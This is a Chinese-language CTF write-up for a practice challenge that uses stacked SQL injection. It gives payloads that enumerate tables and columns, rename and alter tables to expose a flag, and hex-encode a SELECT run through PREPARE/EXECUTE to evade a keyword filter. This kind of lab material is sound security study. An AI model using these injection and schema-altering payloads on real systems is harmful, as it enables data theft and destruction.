---
{"dg-publish":true,"title":"BUU_强网杯随便注","dg-path":"安全/靶场/BUU_强网杯随便注.md","permalink":"/安全/靶场/BUU_强网杯随便注/","dgPassFrontmatter":true}
---


# 整体思路

这题的关键点在于可以使用堆叠注入，但是注意有屏蔽关键词
![Pasted image 20240803101900.png](/img/user/picture/Pasted%20image%2020240803101900.png)



# 注入流程


先看一下表名
```sql
0'; show tables;
```
![Pasted image 20240803102008.png](/img/user/picture/Pasted%20image%2020240803102008.png)

再看一下列名
```sql
0'; show columns from `1919810931114514`; #
```


> [!NOTE] 注意
> 表名为数字时，要用反引号包起来查询。

![Pasted image 20240803102241.png](/img/user/picture/Pasted%20image%2020240803102241.png)

可以看到我们要找的数据就在`1919810931114514`表中



## 思路一

在输入框输入id的时候会在words表中进行查询，所以第一个思路就是将`1919810931114514`表重命名为words,并且把words表给改掉


```sql
1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#

```

之后再查询1 flag就直接出来了
![Pasted image 20240803102620.png](/img/user/picture/Pasted%20image%2020240803102620.png)



## 思路二

因为select被过滤了，所以先将select * from ` `1919810931114514` `进行16进制编码

再通过构造payload得

`;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`

进而得到flag

- prepare…from…是预处理语句，会进行编码转换。
- execute用来执行由SQLPrepare创建的SQL语句。
- SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。


